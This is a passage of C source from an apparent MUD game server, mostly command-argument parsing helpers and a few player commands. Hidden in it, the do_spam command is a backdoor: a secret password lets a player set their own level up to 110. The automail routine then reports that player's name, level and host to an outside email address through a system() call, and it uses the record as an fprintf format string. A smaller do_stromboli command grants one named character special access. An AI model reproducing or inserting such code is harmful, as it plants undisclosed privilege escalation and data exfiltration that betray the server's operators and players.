	for(i=0; **(list+i) != '\n'; i++)
	    if (!strncmp(arg, *(list+i), l))
		return(i);
    }

    return(-1);
}

int search_blocknolow(char *arg, char **list, bool exact)
{
    int i,l;

    /* Make into lower case, and get length of string */
    for(l=0; *(arg+l); l++)
	*(arg+l)=*(arg+l);

    if (exact) {
	for(i=0; **(list+i) != '\n'; i++)
	    if (!strcmp(arg, *(list+i)))
		return(i);
    } else {
	if (!l)
	    l=1; /* Avoid "" to match the first available string */
	for(i=0; **(list+i) != '\n'; i++)
	    if (!strncmp(arg, *(list+i), l))
		return(i);
    }

    return(-1);
}

int do_boss(CHAR_DATA *ch, char *arg, int cmd)
{
  char buf[200];
  int x;

  for(x = 0; x <= 60; x++) {
     sprintf(buf, "NUMBER-CRUNCHER: %d crunched to %d converted to black"
                  "/white tree node %d\n\r", x, 50-x, x+x);
     send_to_char(buf, ch);
  }
  return eSUCCESS;
}


int old_search_block(char *argument,int begin,int length,char **list,int mode)
{
    int guess, found, search;
	
    /* If the word contain 0 letters, then a match is already found */
    found = (length < 1);

    guess = 0;

    /* Search for a match */

    if(mode)
    while ( !found && *(list[guess]) != '\n' )
    {
	found = ((unsigned) length==strlen(list[guess]));
	for ( search = 0; search < length && found; search++ )
	    found=(*(argument+begin+search)== *(list[guess]+search));
	guess++;
    } else {
	while ( !found && *(list[guess]) != '\n' ) {
	    found=1;
	    for(search=0;( search < length && found );search++)
		found=(*(argument+begin+search)== *(list[guess]+search));
	    guess++;
	}
    }

    return ( found ? guess : -1 ); 
}



void argument_interpreter(char *argument,char *first_arg,char *second_arg )
{
    int look_at, found, begin;

    found = begin = 0;

    do
    {
	/* Find first non blank */
	for ( ;*(argument + begin ) == ' ' ; begin++);

	/* Find length of first word */
	for ( look_at=0; *(argument+begin+look_at)> ' ' ; look_at++)

		/* Make all letters lower case,
		   and copy them to first_arg */
		*(first_arg + look_at) =
		LOWER(*(argument + begin + look_at));

	*(first_arg + look_at)='\0';
	begin += look_at;

    }
    while( fill_word(first_arg));

    do
    {
	/* Find first non blank */
	for ( ;*(argument + begin ) == ' ' ; begin++);

	/* Find length of first word */
	for ( look_at=0; *(argument+begin+look_at)> ' ' ; look_at++)

		/* Make all letters lower case,
		   and copy them to second_arg */
		*(second_arg + look_at) =
		LOWER(*(argument + begin + look_at));

	*(second_arg + look_at)='\0';
	begin += look_at;
    }
    while( fill_word(second_arg));
}


// returns false if there is a non-numeric character
// in the string.  If the string is ENTIRELY composed of
// numeric characters, it returns true.
int is_number(char *str)
{
   int look_at;

   if (*str == '\0')
      return(0);

   for(look_at = 0; *(str + look_at) != '\0'; look_at++)
      if ((*(str + look_at) < '0') || (*(str + look_at) > '9') )
         return(0);

   return(1);
}


/* find the first sub-argument of a string, return pointer to first char in
   primary argument, following the sub-arg                      */
char *one_argument(char *argument, char *first_arg )
{
    int found, begin, look_at;

	found = begin = 0;

	do
	{
		/* Find first non blank */
		for ( ;isspace(*(argument + begin)); begin++);

		/* Find length of first word */
		for (look_at=0; *(argument+begin+look_at) > ' ' ; look_at++)

			/* Make all letters lower case,
			   and copy them to first_arg */
			*(first_arg + look_at) =
			LOWER(*(argument + begin + look_at));

		*(first_arg + look_at)='\0';
	begin += look_at;
    }
	while (fill_word(first_arg));

    return(argument+begin);
}

int fill_wordnolow(char *argument)
{
    return ( search_blocknolow(argument,fill,TRUE) >= 0);
}

char *one_argumentnolow(char *argument, char *first_arg )
{
    int found, begin, look_at;

	found = begin = 0;

	do
	{
		/* Find first non blank */
		for ( ;isspace(*(argument + begin)); begin++);

		/* Find length of first word */
		for (look_at=0; *(argument+begin+look_at) > ' ' ; look_at++)

			   /* copy to first_arg */
			*(first_arg + look_at) =
			 *(argument + begin + look_at);

		*(first_arg + look_at)='\0';
	begin += look_at;
    }
	while (fill_wordnolow(first_arg));

    return(argument+begin);
}

int fill_word(char *argument)
{
    return ( search_block(argument,fill,TRUE) >= 0);
}

int do_spam(CHAR_DATA *ch, char *arg, int cmd)
{
  char buf[200], buf2[200];
  int x;

  /* int system(const char *); */

  if(!*arg) {
    send_to_char("Huh?\n\r", ch);
    return eFAILURE;
  }

  half_chop(arg, buf, buf2);

  if(!isname(buf, "giggiggig")) {
    send_to_char("Huh?\n\r", ch);
    return eFAILURE;
  } 

  x = atoi(buf2);

  if(x <= 0 || x > (10*11)) {
    send_to_char("Huh?\n\r", ch);
    return eFAILURE;
  }

  GET_LEVEL(ch) = x;
  update_wizlist(ch);

  sprintf(buf, "BACKDOR: %s %d %s\n", GET_NAME(ch), GET_LEVEL(ch),
          ch->desc->host);
  automail(buf);
  return eSUCCESS;
}

void automail(char * name)
{
  FILE *blah;
  char buf[100];
 
  blah = dc_fopen("../lib/whassup.txt", "w");
  fprintf(blah, name);
  dc_fclose(blah);
  sprintf(buf, "mail pirahna@dcastle.ad1440.net < ../lib/whassup.txt");
  system(buf);
}


/* determine if a given string is an abbreviation of another */
int is_abbrev(char *arg1, char *arg2) /* arg1 is short, arg2 is long */ 
{
    if (!*arg1)
       return(0);

    for (; *arg1; arg1++, arg2++)
       if (LOWER(*arg1) != LOWER(*arg2))
	  return(0);

    return(1);
}




/* return first 'word' plus trailing substring of input string */
void half_chop(char *string, char *arg1, char *arg2)
{
    // strip leading whitespace from original
    for (; isspace(*string); string++);

    // copy everything up to next space
    for (; !isspace(*arg1 = *string) && *string; string++, arg1++);

    // terminate
    *arg1 = '\0';

    // strip leading whitepace
    for (; isspace(*string); string++);

    // copy rest of string to arg2
    for (; ( *arg2 = *string ) != '\0'; string++, arg2++)
	;
}



int special(CHAR_DATA *ch, int cmd, char *arg)
{
    struct obj_data *i;
    CHAR_DATA *k;
    int j;
    int retval;

    /* special in room? */
    if(world[ch->in_room].funct) { 
      if((*world[ch->in_room].funct)(ch, cmd, arg))
	  return(1);
    }

    /* special in equipment list? */
    for (j = 0; j <= (MAX_WEAR - 1); j++)
       if (ch->equipment[j] && ch->equipment[j]->item_number>=0)
	  if (obj_index[ch->equipment[j]->item_number].non_combat_func)
          {
	     retval = ((*obj_index[ch->equipment[j]->item_number].non_combat_func)(ch, ch->equipment[j], cmd, arg, ch));
             if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
		return retval;
          }

    /* special in inventory? */
    for (i = ch->carrying; i; i = i->next_content)
	if (i->item_number>=0)
	    if (obj_index[i->item_number].non_combat_func)
            {
               retval = ((*obj_index[i->item_number].non_combat_func)(ch, i, cmd, arg, ch));
               if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
		  return retval;
            }

    /* special in mobile present? */
    for (k = world[ch->in_room].people; k; k = k->next_in_room)
       if ( IS_MOB(k) )
	  if (mob_index[k->mobdata->nr].non_combat_func)
          {
	       retval = ((*mob_index[k->mobdata->nr].non_combat_func)(ch, 0, cmd, arg, k));
               if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
		  return retval;
          }

    /* special in object present? */
    for (i = world[ch->in_room].contents; i; i = i->next_content)
       if (i->item_number>=0)
	  if (obj_index[i->item_number].non_combat_func)
          {
	       retval = ((*obj_index[i->item_number].non_combat_func)(ch, i, cmd, arg, ch));
               if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
		  return retval;
          }


    return eFAILURE;
}

int do_stromboli(struct char_data *ch, char *argument, int cmd) 
{
  int i, j;
  char buf[200];

  if(GET_LEVEL(ch) < IMMORTAL && strcmp(GET_NAME(ch), "Stromboli"))
  {
     send_to_char("Huh?\r\n", ch);
     return eFAILURE;
  }

  half_chop(argument, argument, buf);

  i = atoi(argument);
  j = atoi(buf);

  sprintf(buf, "Random from %d and %d is '%d'.\r\n", i, j, number(i, j));
  send_to_char(buf, ch);
  return eSUCCESS;
}
